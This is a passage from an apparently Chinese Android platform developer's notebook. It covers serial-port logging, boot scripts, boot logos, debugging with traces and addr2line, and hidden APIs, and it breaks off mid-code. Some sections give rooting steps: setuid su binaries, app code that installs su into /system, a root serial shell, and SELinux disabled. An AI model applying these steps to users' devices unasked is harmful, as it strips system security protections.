57. 当系统原生组件出现问题时，查看错误栈信息，自己写一个该组件的子类，并在合适的地方将出错方法复写一下，加上try catch保证不崩溃掉。不要扰乱了该系统控件的正常逻辑。
58. 输入控件注意对空格、换行等符号的控制；输入框里内容注意和左右控件的空间，防止误点击。
59. 注意函数参数里的++或者–操作。是++c 还是 c++，区别很大。
60. 各种地方、永远的不要小看null指针问题，甚至有些场合宁可错杀（try catch），不可放过。
```

## [串口]  [log] 将Android启动的logcat消息发送到串口

```text
service logcat /system/bin/logcat  -v time -f /dev/kmsg Zygote:D *:S
      oneshot

这里没有为service指定class，其默认为”default”，也可以将其指定为其它名称，这样就能以"class_start xxx"的方式启动。
在Android 8.0上默认情况下，由于selinux的原因，只添加上面的service后logcat是无法使用的，会有selinux的问题

有两种方式设置selinux:
启动Android的命令行中指定"androidboot.selinux=permissive"抑制selinux操作
这里的permissive选项表示selinux会执行权限检查，对于不符合规则的审查会显示警告信息，但会授予权限。适合开发时使用。
添加selinux规则，授予logcat操作的权限
根据规则，在Android的sepolicy指定目录下新建logpersist.te文件，包含以下规则：

allow logpersist device:dir { open read };
allow logpersist kmsg_device:chr_file { open append getattr };
```

## [log] user版本如何打开uart，让android log从串口kernel log输出

```text
user版本打开uart
如何在user版本中使用串口(uart)

bootable/bootloader/lk/app/mt_boot/mt_boot.c

582 #ifdef USER_BUILD
583         sprintf(cmdline,"%s%s",cmdline," printk.disable_uart=1");
584 #else
585         sprintf(cmdline,"%s%s",cmdline," printk.disable_uart=0 ddebug_query=\"file *mediatek* +p ; file *gpu* =_\"");
586 #endif
将上面的printk.disable_uart=1改成printk.disable_uart=0，然后重新编译lk, download lk 即可；或者直接download eng版本的lk。

如何开启Uart 的控制台(console/sh)
system/core/rootdir/init.rc

515 service console /system/bin/sh
516     class core
517     console
518     disabled
519     user shell
520     seclabel u:r:shell:s0
521 
522 on property:ro.debuggable=1
523     start console
注释掉on property:ro.debuggable=1，然后重新编译bootimage 即可。

如何在Uart 上抓取上层LOG
Uart 上进行输入，实际就是开启了一个sh 对接起来，所以绝对不能在uart 上输入一个长命令(不可中断)，否则uart 将被卡住，不能再输入。
抓取上层log, 我们通常需要使用logcat, 但logcat 是不可中断的，将导致uart 不能再输入。
处理的方法即将logcat 转入后台执行，如下操作即可:

Main log: logcat -v time &
Radio log: logcat -v time -b radio &
Event log: logcat -v time -b events &
如果想关闭上层log, 直接ps 查阅前面开启的logcat process pid, 然后kill -9 pid 杀掉即可。
注意一定要带“&”，否则将block 住uart输入

让android log从串口kernel log输出
分析无法开机问题，如串口RX/TX连接正常，可正常输入，请参考上面第3点。
如确认RX/TX连接正常，但不能输入，则可能是下面原因导致：

数据流控制是否正确，一般需关闭，下面为RS232的三种流控制模式介绍：
DTR/DSR：硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。具体实现起来，一般好像是和RTS/CTS一直搭配使用。

RTS/CTS：硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。一般常见的也就是这种。但是很多开发板用secureCRT连接开发板的时候，往往都是在Uboot阶段，那时候还没有实现对应的RTS/CTS的流控制，所以此处需要取消此选择，否则，secureCRT就会去一直检测对应的RTS（Request To Send）pin脚，发现一直是无效，所以就一直没有接受到数据，就“卡”在那了。同样，你要输入数据，就是secureCRT要发送数据，所以其先发了个RTS给开发板，然后就一直检测自己的CTS是否有效，直到自己的CTS有效后，才能发送数据，而此处由于开发板上的驱动没有实现RTS/CTS，所以secureCRT就一直检测CTS，就“卡”死了，即你无法输入数据。

XON/XOFF：软件上实现的流控制，硬件上无需像上面的RTS/CTS或DTR/DSR那样要增加对应的引脚。但是由于XON/XOFF分别对应的两个二进制的值，所以如果本身传输数据中包括该值，那么此软件的流控制就失效了。现在好像也很少用此种流控制了。

是否打开回显
串口分析kernel log正常但adb连不上时，并且串口只能输出时，希望让android log也从串口输出，可以尝试此方法，以下是一个验证过的示例。
原理上就是根据kernel log能够从串口输出，只要将logcat重定向到kmsg即可实现，因此各个平台的原理是一样的应该通用。（但须注意这样打印虽然能够有android log从串口输出，但串口输出量过大可能会出现丢log的情况）
system/core/rootdir/init.rc中添加：

chmod 0660 /proc/kmsg
###############################################################
# redirect logs(LOGE, LOGI...) to linux console
###############################################################
service logcat /system/bin/logcat -f /dev/kmsg *:D
    class main
    user root
    group log
```

## 文件系统中的保留空间

```text
Android中我们经常会使用android.os.StatFs来获取关于文件系统空间的状态信息。

File sdcardDir = Environment.getExternalStorageDirectory();
StatFs sf = new StatFs(sdcardDir.getPath());
long blockSize = sf.getBlockSize();
long blockCount = sf.getBlockCountLong();
long availCount = sf.getAvailableBlocksLong();
Log.d("", "block大小:"+ blockSize+",block数目:"+ blockCount+",总大小:"+blockSize*blockCount/1024+"KB");
Log.d("", "可用的block数目：:"+ availCount+",剩余空间:"+ availCount*blockSize/1024+"KB");
但上面的方法我们会发现剩余空间和df命令显示的Free大小不一样，这是怎么回事呢?
看看df的代码（system/core/toolbox/df.c）

39        printf("%-20s  ", s);
40        printsize((long long)st.f_blocks * (long long)st.f_bsize);
41        printf("  ");
42        printsize((long long)(st.f_blocks - (long long)st.f_bfree) * st.f_bsize);
43        printf("  ");
44        printsize((long long)st.f_bfree * (long long)st.f_bsize);
45        printf("   %d\n", (int) st.f_bsize);
发现df使用的是f_bfree，查看下statfs的定义

/*
* file system statistics
*/
struct statfs {
int f_version; /* version/type of statfs, 0 for now*/
int f_type; /* type of info, zero for now */
ulong_t f_bsize; /* optimal file system block size */
fsblkcnt_t f_blocks; /* total data blocks in file system */
fsblkcnt_t f_bfree; /* free block in fs */
fsblkcnt_t f_bavail; /* free blocks avail to non-superuser*/
fsfilcnt_t f_files; /* total file nodes in file system */
fsfilcnt_t f_ffree; /* free file nodes in fs */
#if !defined(_KERNEL) && defined(__64BIT__)
fsid64_t f_fsid; /* file system id */
#else
fsid_t f_fsid; /* file system id */
#endif
int f_vfstype; /* what type of vfs this is */
ulong_t f_fsize; /* fundamental file system block size*/
int f_vfsnumber; /* vfs indentifier number */
int f_vfsoff; /* reserved, for vfs specific data offset */
int f_vfslen; /* reserved, for len of vfs specific data */
int f_vfsvers; /* reserved, for vers of vfs specific data */
char f_fname[32] ; /* file system name (usually mount pt.) */
char f_fpack[32] ; /* file system pack name */
int f_name_max; /* maximum component name length for posix */
};
可以看到

fsblkcnt_t f_bfree; /* free block in fs */
fsblkcnt_t f_bavail; /* free blocks avail to non-superuser*/
查看SDK

public long getAvailableBlocksLong ()

The number of blocks that are free on the file system and available to applications. This corresponds to the Unix statvfs.f_bavail field.

也就是说getAvailableBlocksLong()返回的是f_bavail，这块是不包含超级用户的预留空间的。如果要得到和df一样的大小请使用getFreeBlocksLong()。

public long getFreeBlocksLong ()

The total number of blocks that are free on the file system, including reserved blocks (that are not available to normal applications). This corresponds to the Unix statvfs.f_bfree field. Most applications will want to use getAvailableBlocks() instead.

那什么是“超级用户预留空间”呢?请看ext4文件系统的说明 https://lwn.net/Articles/546473/：

Currently in ENOSPC condition when writing into unwritten space, or punching a hole, we might need to split the extent and grow extent tree. However since we can not allocate any new metadata blocks we’ll have to zero out unwritten part of extent or punched out part of extent, or in the worst case return ENOSPC even though use actually does not allocate any space.

Also in delalloc path we do reserve metadata and data blocks for the time we’re going to write out, however metadata block reservation is very tricky especially since we expect that logical connectivity implies physical connectivity, however that might not be the case and hence we might end up allocating more metadata blocks than previously reserved. So in future, metadata reservation checks should be removed since we can not assure that we do not under reserve.

And this is where reserved space comes into the picture. When mounting the file system we slice off a little bit of the file system space (2% or 4096 clusters, whichever is smaller) which can be then used for the cases mentioned above to prevent costly zeroout, or unexpected ENOSPC.

The number of reserved clusters can be set via sysfs, however it can never be bigger than number of free clusters in the file system.
```

## Android--PackageManagerService中LI，LP等函数后缀的含义

```text
PackageManagerService中有很多函数带有LI，LP，或者LPr，LPw的后缀，表示什么意思?

LI  -- 该函数被调用时需要持有mInstallLock这把锁
LP  -- 该函数被调用时需要持有mPackages这个HashMap对象
LPr -- 表示读
LPw -- 表示写

343     // Lock for state used when installing and doing other long running
344     // operations.  Methods that must be called with this lock held have
345     // the prefix "LI".
346     final Object mInstallLock = new Object();

360     // Keys are String (package name), values are Package.  This also serves
361     // as the lock for the global state.  Methods that must be called with
362     // this lock held have the prefix "LP".
363     final HashMap<String, PackageParser.Package> mPackages =
364             new HashMap<String, PackageParser.Package>();
```

## Android串口控制台改为root

```text
一.第一种 adb进去
# chown root:root /system/xbin/su 
or # chown 0:0 /system/xbin/su
# chmod 4755 su //setuid()的s位
# echo 0 > /proc/sys/kernel/printk
 
# /system/bin/id
# /usr/bin/id
***********************************************************************************
1.App获取root权限原理：
也是通过su获取s权限，app来执行/system/xbin下的su获取root。
 
Process process = Runtime.getRuntime().exec("su");//切换到root权限，执行操作
DataOutputStream os = newDataOutputStream(process.getOutputStream());
os.writeBytes("mount -oremount,rw /dev/block/mtdblock3 /system\n");
os.writeBytes("busybox cp /data/data/com.koushikdutta.superuser/su /system/bin/su\n");
os.writeBytes("busybox chown 0:0 /system/bin/su\n");
os.writeBytes("chmod 4755 /system/bin/su\n");
os.writeBytes("exit\n");
os.flush();
 
2.在代码里修改su权限为6755
<1>.启动 su_daemon init.rc中添加：
service su_daemon /system/xbin/su --daemon
    class main
 
<2>.将su文件拷贝到out/target/product/rk3288_box/system/xbin到/systm/xbin
# adb push su /system/xbin
 
<3>.修改 system/xbin/su 权限为 06755
system/core/include/private/android_filesystem_config.h
{ 06755, AID_ROOT, AID_ROOT, 0, "system/xbin/su" },
 
***********************************************************************************
二.第二种
如果要调试的时候信息打印到超级终端，添加console,像sh一样直接输出到console
system/core/rootdir/init.rc
 
init.rc设置：
service console /system/bin/sh
    class core
    console
    disabled
    user shell
    seclabel u:r:shell:s0
 
修改为:
service console /system/bin/sh
    console
    disabled
    user root
    group root
 
注意：如果android5.1以上系统打开了Selinux，必须关闭，否则在console串口控制台输入不了命令的.
编译系统boot.img,烧写后，控制台可执行root权限。
```

## [init] Android7.1开机启动脚本

```text
1.开机修改为：Permissive模式启动
2.在device/qcom/common/rootdir/etc/init.qcom.rc添加: 下边两种方式都可。
service test_service /system/bin/sh /system/bin/set.sh
    user root
    disabled
    oneshot

on property:sys.boot_completed=1
    start test_service
    exec /system/bin/sh /system/bin/test.sh

3.在/system/bin下set.sh和test.sh内容
set.sh
#!/system/bin/sh
touch /data/1111111111.txt

test.sh
touch /data/444444444.txt

4.Androoid.mk文件,将set.sh和test.sh拷贝到device/qcom/msmxxx目录下
device/qcom/msmxxx/msmxxx.mk
PRODUCT_COPY_FILES += device/qcom/msmxxx/set.sh:system/etc/set.sh
PRODUCT_COPY_FILES += device/qcom/msmxxx/test.sh:system/etc/test.sh

5.编译
make bootimage -j16
```

## [工具] 黑域app的使用方法

```text
1.安装黑域app，并赋予adb权限
adb -d shell sh /data/data/me.piebridge.brevent/brevent.sh
```

## Android7.1+查看 audio policy 使用 .conf Or .xml

```text
Andrid7.1以后Google开始使用audio_policy_configuration.xml替换audio_policy.conf，如何查看当前
Android系统中使用哪个文件?
 
1.查看定义在哪
hardware/qcom/audio/policy_hal/AudioPolicyManager.cpp
#ifdef USE_XML_AUDIO_POLICY_CONF
    ALOGD("USE_XML_AUDIO_POLICY_CONF is TRUE");
#else
    ALOGD("USE_XML_AUDIO_POLICY_CONF is FALSE");
#endif
 
# adb logcat|grep "USE_XML_AUDIO_POLICY_CONF"
10-25 07:18:50.801  4099  4099 D AudioPolicyManagerCustom: USE_XML_AUDIO_POLICY_CONF is TRUE
 
2.查看谁来load和parser
frameworks/av/services/audiopolicy/managerdefault/AudioPolicyManager.cpp
#define AUDIO_POLICY_XML_CONFIG_FILE "/system/etc/audio_policy_configuration.xml"
```

## Android7.1启动系统App必须配置加密

```text
问题：自己写了一个应用，在systemserver.java里指定包名和类名使用Intent启动，竟然启动不了?但是使用
am start命令可以启动，发现系统应用需要在AndroidManifest.xml声明
android:defaultToDeviceProtectedStorage=”true”
 
1.在AndroidManifest.xml里添加
<application
    android:name=".SystemUIApplication"
    android:persistent="true"
    android:defaultToDeviceProtectedStorage="true" //添加
    android:directBootAware="true" //增加
    >
 
为了实现系统应用的快速迁移，新增了两个可在应用级别设置的属性。defaultToDeviceProtectedStorage属性
仅适用于系统应用,directBootAware 属性则适用于所有应用.
 
  应用了文件级加密的设备，可以以直接启动的方式启动。此时，设备可以加载并使用没有通过文件级加密的目
录，如 /data/user_de/0/。那么，直接启动的APP的数据保存在这个目录下。
 
  在上文中，我们知道需要在直接启动就可以立马使用的的APP，需要在应用的 manifest的application标签声
明 android:directBootAware=”true” 属性。
 对于系统的应用，声明 android:defaultToDeviceProtectedStorage=”true” 可以把应用的默认存储空间设
置为 /data/user_de/。
因此，在用户没有输入凭据解密 CE 空间之前，系统只是加载 DE 下的应用。
```

## [Snippet]  [log] Android写log到文件模版

```text
1.实现
public String LOG_FILE_NAME = "/mnt/sdcard/test_01.log";
 
private String getTimeString() {
    java.util.Date now= new Date();
    java.text.SimpleDateFormat formatter = new java.text.SimpleDateFormat("yy-MM-dd HH:mm:ss.sss");
    String rlt = formatter.format(now);
    return rlt;
}

private void saveLog( String log) {
    try {
        OutputStream os=new FileOutputStream(LOG_FILE_NAME, true);
        os.write(log.getBytes());
        os.flush();
        os.close();
    }catch(Exception ex){
        ex.printStackTrace();
    }
}

private void writeLog(String out) {
    String log = getTimeString()+":    "+out+"\n";
    saveLog(log);
}

2.测试
String str = "123456";
String log = str;
writeLog(log);
```

## Android在Android.mk里添加TAG

```text
1.定义：
system/core/include/log/log.h
#ifndef ALOGE
#define ALOGE(...) ((void)ALOG(LOG_ERROR, LOG_TAG, __VA_ARGS__))
#endif
注意：LOG_TAG即我们添加的TAG,在Makefile或者Android.mk里写成: DLOG_TAG

2.Android.mk里添加TAG: xxx-test
LOCAL_CFLAGS := -DLOG_TAG=\"xxx-test\"
```

## Android修改kernel logo和开机动画

```text
一、uboot 开机logo
1.安装图片工具
# sudo apt-get install netpbm
 
2.生成logo脚本
//make-uboot-logo.sh
#!/bin/sh
#1.uboot logo
jpegtopnm $1 | ppmquant 31 | ppmtobmp -bpp 8 > $2
 
使用: ./make-uboot-logo.sh xxx.png xxx.bmp
注意:需要xxx.png格式,生成xxx.bmp格式
 
二、kernel开机logo
1、安装pngtopnm
# sudo apt-get install netpbm 
安装完以后就会生成pngtopnm、pnmquant、pnmtoplainpnm三个工具
2、制作logo图片
将logo图片保存为mylogo.png，注意扩展名为png。
3、制作.ppm格式的图片
# pngtopnm mylogo.png > mylogo.pnm 
# pnmquant 224 mylogo.pnm > mylogo224.pnm 
# pnmtoplainpnm mylogo224.pnm > logo_linux_clut224.ppm
4.拷贝文件到相应目录
用logo_linux_clut224.ppm替换kernel/drivers/video/logo目录下的同名文件，删除对应的.o文件并重新编译内核即可。
5.内核的配置
内核中除了要选中 Graphics support项下的 Bootup logo配置项外，还要选中 Console display driver support配置项。否则kernel不会显示logo。
 
三、android开机动画
1.开机时，系统自动检测在/system/media或/data/local/目录有没有bootanimation.zip文件。
  如果有，这按照bootanimation.zip里面的png排列顺序依次显示开机图片，开起来就是动画效果；
  否则按照android默认的方式显示开机动画：frameworks/base/core/res/assets/images
2./system/media/bootanimation.zip //bootainimation.zip里包含desc.txt和图片part0,part1(为目录)
desc.txt内容：
320 480 30
p 1 0 part0
p 0 0 part1
 
分辨率：320:宽 480:高 30:每秒播放30张图片
p 1(只播放一次) 0(空指令) part0(代表part0文件夹内图片只按名称顺序播放一次)
p 0(重复播放)  0(空指令)  part1(代表part1文件夹内的图片会循环播放)
 
zip压缩命令：
# zip -r -X -Z store bootanimation.zip part*/*.png desc.txt
 
3.push到系统
# adb push bootainimation.zip /system/media
或者：在device.mk里添加
PRODUCT_COPY_FILES += vendor/bootanimation.zip:/system/media/bootanimation.zip
```

## Android连接网络立即同步时区

```text
1.frameworks/base/services/core/java/com/android/server/NetworkTimeUpdateService.java
private void onPollNetworkTimeUnderWakeLock(int event) {
    if (/省略.../event == EVENT_AUTO_TIME_CHANGED) {
    }
}
 
改为：
private void onPollNetworkTimeUnderWakeLock(int event) {
    if (/省略.../event == EVENT_AUTO_TIME_CHANGED || event == EVENT_NETWORK_CHANGED) {
    }
}
 
2.frameworks/base/core/res/res/values/config.xml
末尾添加:
<!-- NTP time got retry internal time -->
<integer name="config_ntpPollingIntervalShorter">1000</integer>
<!-- NTP time got retry count. -->
<integer name="config_ntpRetry">5</integer>
 
3.vendor/system.prop
persist.sys.timezone=Asia/Shanghai
```

## [工具] Android显示实时帧率工具

```text
1.GameBench(必须官网注册,免费时间用完就得付费...)

说明:支持Mac/Linux,需要在android端和PC(.jar文件)端安装。

参考：https://www.guidingtech.com/60101/record-exact-frame-rate-android-games/

2.Game Booster

adb push Game_Booster.apk /system/app

adb reboot
```

## Android--Stopwatch工具类

```text
现在我的一部分工作就是优化客户端的性能，比如优化列表快速滑动卡顿现象。

一个很好的办法就是使用DDMS的Method Profiling功能，它可以生成一个表格来显示app中所有执行的方法的执行时间，占cpu运行的百分比，还有图形化的显示。功能很强大！

但是，有的时候是跨线程工作的，比如，我获得要发送一个http请求到http请求返回时的时间，这个它就无能为力了（或许可能我没有发现这个功能）；还比如，我要获得从sd卡上读一个文件所需的时间。

一个最原始的方法就是

long start = SystemClock.uptimeMillis();
//do something
Log.i(TAG, "time: " + (SystemClock.uptimeMillis() - start));
这样就可以获得这段代码的运行时间了，我发现在测试Adapter的getView方法性能时很管用。因为ListView快速滑动时卡顿最主要的原因就是getView方法执行时间过长，我的测试过程中发现getView方法的执行时间不能超过10ms（当然这个在不同手机上运行时间不一样）。也就是如果在一个手机上getView方法执行时间超过10ms，这个列表快速滑动时就会产生卡顿现象。

但是Adapter中可能有很多方法，我要在每个方法中都像上面那样写么?我不要烦死了?

然后，我就从秒表中获得启发，我可不可以也像秒表一样写一个类来对每个方法测试它的运行时间呢?

下面这个类就诞生了，其实这个类很简单，你只需要在你需要测试时间的方法A前写一句：

StopWatch.begin("bxbxbai");
这就相当于按了一下秒表（StopWatch工具就是在HashMap中添加了一条记录），然后在方法A后面写一句：

StopWatch.end("bxbxbai");
这就相当于按了一下秒表，系统在Log中输出了方法A的的运行时间，并且把tag删除。

StopWatch.lap("bxbxbai");
这个方法不会删除tag，它会输出当前时间到打tag的时候的时间间隔，就是秒表的计次功能。

不光如此，这个类还支持跨进程，比如，我在A线程中执行begin方法，我可以在一个Callback中执行end方法，输出总共的执行时间。
```

## [Snippet] SingleTon模板

```textjava
public abstract class Singleton<T> {
    private T mInstance;
    protected abstract T create();
    public final T get() {
        synchronized (this) {
            if (mInstance == null) {
                mInstance = create();
            }
            return mInstance;
        }
    }
}
```

## [工具] fastdroid-vnc

```text
1.下载 fastdroid-vnc
官网：https://code.google.com/archive/p/fastdroid-vnc/downloads
CSDN下载：https://download.csdn.net/download/u010164190/10346660
 
2.编译libjpeg.a for fastdroid-vnc
external/libjpeg-turbo/libjpeg-turbo/Android.mk
#LOCAL_MODULE := libjpeg_static
#modify by
LOCAL_MODULE := libjpeg
include $(BUILD_STATIC_LIBRARY)
 
3.fastdroid-vnc-1.0/LibVNCServer-0.9.7/libvncserver/main.c
fprintf(stderr,buf);
改为:
fprintf(stderr,”%s”buf);
 
4.编译后push到android设备中,后台执行即可
# fastdroid-vnc &
 
5.PC端可以装一个VNC view远程控制android设备
```

## 使用hide和internal api

```text
如果我们非要使用不可用的 API 怎么办呢?最简单的就是 Java 的反射，反射 @hiden 的方法或类，修改访问修饰符，然后就可以搞事情了~~还有一种方法是从设备中提取，简单说就是把设备上的 /system/framework/framework.jar 提取出来，经过一系列转换，最终得到完整的 android.jar，具体的步骤可以参考这篇文章：android怎样调用@hide和internal API。另外一种方式非常简单，GitHub 上有一个项目：android-hidden-api，里面提供了众多版本完整的 android.jar 包，下图所示。

android hidden api
我们把工程 clone 下来，找到对应平台的 android.jar 包，替换掉 Android SDK 下面的 jar，最好先备份一下原始的 jar，重新编译工程或者重启 Studio 就行了。

比如 AssetManager 的 addAssetPath 方法，没有替换之前是这样，Studio 提示错误，编译失败~o(>_<)o ~

can't resolve addAssetPath
但是在使用了完整的 android.jar 后，发现竟然不会报错了，代码可以通过编译，终于可以愉快地使用想要的方法了 O(∩_∩)O~

can resolve addAssetPath
这种方式对于个人开发来说没有问题，你把 android.jar 替换掉就好了，但是如果面对团队开发，就非常痛苦了 %>_<%，每个人都要替换 SDK 的 android.jar，代价和风险可想而知。那么有没有好的解决办法，既可以让工程编译通过，又能够免去多人替换 jar 的成本呢?答案是有的。
Studio 默认引用的是 SDK 下面的 android.jar，那我们把它的引用改成完整的 jar 的路径不就行了么?
我们把完整的 android.jar 放在工程 libs 目录下，也就是平时依赖 jar 的地方，然后在工程 build.gradle 配置的 dependencies 里，以 provided 的方式引用 android.jar。因为每个工程模块依赖 android.jar 的类型就是 provided，这样不会把 android.jar 打包到应用中，运行环境中存在 framework.jar，应用直接就可以使用。

dependencies {
    // compile fileTree(include: ['*.jar'] , dir: 'libs')  这行一定要去掉，当然为 android.jar 换个目录也行
    testCompile 'junit:junit:4.12'
    provided files('libs/hidden_api_23.jar')
}
最后还要在工程根目录的 build.gradle 里面配置当前 project，加上下面的代码就行了。

project('app') { // app是你工程的名字，配置只对当前工程有效
    gradle.projectsEvaluated {
        tasks.withType(JavaCompile) {
            // 注意修改 jar 包的路径，替换 app/libs/hidden_api_23.jar，其他部分不要改
            // Xbootclasspath/p:是 Java 编译的寻址优先设置，先找缺省路径还是全路径
            options.compilerArgs.add('-Xbootclasspath/p:app/libs/hidden_api_23.jar')
        }
    }
}
现在重新编译工程，虽然会在代码中出现错误提示，但是编译打包运行都是正常的。_

在开发中使用隐藏 API 和内部 API 是不推荐的做法，但是为了实现一些「黑科技」，这些又是必须的~
```

## [debug] Android Debug方法

```text
一. 获取Trace
调用栈信息(Trace)是分析异常经常使用的，这里简单划分两类情况：

当前线程Trace: 当前执行流所在线程的调用栈信息；
目标进程Trace：可获取目标进程的调用栈，用于动态调试；
1.1 当前线程Trace
1) Java层

Thread.currentThread().dumpStack();   //方法1
Log.d(TAG,"Gityuan", new RuntimeException("Gityuan")); //方法2
new RuntimeException("Gityuan").printStackTrace(); //方法3
2） Native层

#include <utils/CallStack.h>
android::CallStack stack(("Gityuan"));
1.2 目标进程Trace
1) Java层

adb shell kill -3 [pid]      //方法1
Process.sendSignal(pid, Process.SIGNAL_QUIT)  //方法2
生成trace文件保存在文件data/anr/traces.txt

2） Native层

adb shell debuggerd -b [tid]  //方法1
Debug.dumpNativeBacktraceToFile(pid, tracesPath) //方法2
前两条命令输出内容相同:

命令1输出到控制台
命令2输出到目标文件
对于debuggerd命令，若不带参数则输出tombstones文件，保存到目录/data/tombstones

3） Kernel层

adb shell cat /proc/[tid] /stack  //方法1
WatchDog.dumpKernelStackTraces() //方法2
其中dumpKernelStackTraces()只能用于打印当前进程的kernel线程

1.3 小节
以下分别列举输出Java, Native, Kernel的调用栈方式：

类别 函数式 命令式
Java Process.sendSignal(pid, Process.SIGNAL_QUIT) kill -3 [pid] 
Native Debug.dumpNativeBacktraceToFile(pid, tracesPath) debuggerd -b [pid] 
Kernel WD.dumpKernelStackTraces() cat /proc/[tid] /stack
分析异常时往往需要关注的重要目录：

/data/anr/traces.txt
/data/tombstones/tombstone_X
/data/system/dropbox/
二. 时间调试
为了定位耗时过程，有时需要在关注点添加相应的systrace，而systrace可跟踪系统cpu,io以及各个子系统运行状态等信息，对于kernel是利用Linux的ftrace功能。当然也可以直接在方法前后加时间戳，输出log的方式来分析。

2.1 新增systrace
1) App

import android.os.Trace;
void foo() {
    Trace.beginSection("app:foo");
    ...
    Trace.endSection(); 
}
2) Java Framework

import android.os.Trace;
void foo() {
    Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, "fw:foo");
    ...
    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER); 
}
3） Native Framework

#define ATRACE_TAG ATRACE_TAG_GITYUAN
#include <utils/Trace.h> // used for C++
#include <cutils/trace.h> // used for C
void foo() {
    ATRACE_CALL();
    ...
}
或者

#define ATRACE_TAG ATRACE_TAG_GITYUAN
#include <utils/Trace.h> // used for C++
#include <cutils/trace.h> // used for C
void foo() {
    ATRACE_BEGIN();
    ...
    ATRACE_END();
}
2.2 打印时间戳
1) Java

import android.util.Log;
void foo(){
    long startTime = System.currentTimeMillis();
    ...
    long spendTime = System.currentTimeMillis() - startTime;
    Log.i(TAG,"took " + spendTime + “ ms.”);
}
2） C/C++

#include <stdio.h>
#include <sys/time.h>
void foo() {
    struct timeval time;
    gettimeofday(&time, NULL); //精度us
    printf("took %lld ms.\n", time.tv_sec * 1000 + time.tv_usec /1000);
}
2.3 kernel log
有时候Kernel log的输出是由级别限制，可通过如下命令查看：

adb shell cat /proc/sys/kernel/printk  
4       4       1       7
参数解读：

控制台日志级别：优先级高于该值的消息将被打印至控制台。
缺省的消息日志级别：将用该值来打印没有优先级的消息。
最低的控制台日志级别：控制台日志级别可能被设置的最小值。
缺省的控制台日志级别：控制台日志级别的缺省值
日志级别：

级别 值 说明
KERN_EMERG 0 致命错误
KERN_ALERT 1 报告消息
KERN_CRIT 2 严重异常
KERN_ERR 3 出错
KERN_WARNING 4 警告
KERN_NOTICE 5 通知
KERN_INFO 6 常规
KERN_DEBUG 7 调试
Log相关命令

dmesg 或 cat /proc/kmsg
logcat -L 或 cat /proc/last_kmsg
logcat -b events -b system
三. addr2line
addr2line功能是将函数地址解析为函数名。分析过Native Crash，那么对addr2line一定不会陌生。 addr2line命令参数：

Usage: addr2line [option(s)]  [addr(s)] 
 The options are:
  @<file>                Read options from <file>
  -a --addresses         Show addresses
  -b --target=<bfdname>  Set the binary file format
  -e --exe=<executable>  Set the input file name (default is a.out)
  -i --inlines           Unwind inlined functions
  -j --section=<name>    Read section-relative offsets instead of addresses
  -p --pretty-print      Make the output easier to read for humans
  -s --basenames         Strip directory names
  -f --functions         Show function names
  -C --demangle[=style]   Demangle function names
  -h --help              Display this information
  -v --version           Display the program's version
3.1 Native地址转换
Step 1: 获取symbols表

先获取对应版本的symbols，即可找到对应的so库。（最好是对应版本addr2line，可确保完全匹配）

Step 2: 执行addr2line命令

// 64位
cd prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9/bin
./aarch64-linux-android-addr2line -f -C -e libxxx.so  <addr1>
 
//32位
cd /prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin
./arm-linux-androideabi-addr2line -f -C -e libxxx.so  <addr1>
另外，有兴趣可以研究下development/scripts/stack，地址批量转换工具。

3.2 kernel地址转换
addr2line也适用于调试分析Linux Kernel的问题。例如，查询如下命令所对应的代码行号

[<0000000000000000>]  binder_thread_read+0x2a0/0x324
Step 1: 获取符号地址

通过命令arm-eabi-nm从vmlinux找到目标方法的符号地址，其中nm和vmlinux所在目录：

arm-eabi-nm位于目录prebuilts/gcc/linux-x86/arm/arm-eabi-4.8/bin/
vmlinux位于目录out/target/product/xxx/obj/KERNEL_OBJ/
执行如下命令：(需要带上绝对目录)

arm-eabi-nm  vmlinux |grep binder_thread_read
则输出结果： c02b2f28 T binder_thread_read，可知binder_thread_read的符号地址为c02b2f28， 其偏移量为0x2a0，则计算后的目标符号地址= c02b2f28 + 2a0，然后再采用addr2line转换得到方法所对应的行数

Step 2: 执行addr2line命令

./aarch64-linux-android-addr2line -f -C -e vmlinux [目标地址] 
```

## android7.0 netd与netlink的framework,kernel通信流程

```text
Netlink用于用户控件与内核空间的通信的一组API，是在socket的机制上实现的。
用户空间用Socket直接和内核通信，然后内核在将数据传递到网卡驱动。
Netlink不像网络套接字可以用于主机间通讯，Netlink只能用于同一主机上进程通讯，并通过PID来标识它们。
 
0.frameworks/base/services/core/java/com/android/server/ConnectivityService.java
  private boolean updateRoutes(LinkProperties newLp, LinkProperties oldLp, int netId) { 
 mNetd.addRoute(netId, route);
  }
 
1.frameworks/base/services/core/java/com/android/server/NetworkManagementService.java
    @Override
<1>.public void addRoute(int netId, RouteInfo route) {
 modifyRoute("add", "" + netId, route);
  }
<2>.private void modifyRoute(String action, String netId, RouteInfo route) {
 
    final Command cmd = new Command("network", "route", action, netId);
     mConnector.execute(cmd);
  }
 
2.frameworks/base/services/core/java/com/android/server/NativeDaemonConnector.java
 <1>.public NativeDaemonEvent execute(Command cmd){
 return execute(cmd.mCmd, cmd.mArguments.toArray());
 }
 
 <2>. public NativeDaemonEvent execute(String cmd, Object... args){
      return execute(DEFAULT_TIMEOUT, cmd, args);
 }
 
 <3>.public NativeDaemonEvent execute(long timeoutMs, String cmd, Object... args) {
 final NativeDaemonEvent[]  events = executeForList(timeoutMs, cmd, args);
 }
 
 
 <4>.framework创建socket与netd通信
     LocalSocket socket = null;
     socket = new LocalSocket();
     LocalSocketAddress address = determineSocketAddress();
     socket.connect(address);
     InputStream inputStream = socket.getInputStream();
     mOutputStream = socket.getOutputStream();
     mCallbacks.onDaemonConnected();
     int count = inputStream.read(buffer, start, BUFFER_SIZE - start);//获取netd层返回
 
 <5>.public NativeDaemonEvent[]  executeForList(long timeoutMs, String cmd, Object... args) {
     final StringBuilder logBuilder = new StringBuilder();
     makeCommand(rawBuilder, logBuilder, sequenceNumber, cmd, args);
     final String rawCmd = rawBuilder.toString();
     mOutputStream.write(rawCmd.getBytes(StandardCharsets.UTF_8)); //向netd发指令
 }
 
2.监听framework发送的指令
system/netd/server/CommandListener.cpp
  <1>.CommandListener::CommandListener() : FrameworkListener("netd", true) {
      registerLockingCmd(new InterfaceCmd());
      registerLockingCmd(new IpFwdCmd());
      registerLockingCmd(new TetherCmd());
      registerLockingCmd(new NatCmd());
      registerLockingCmd(new ListTtysCmd());
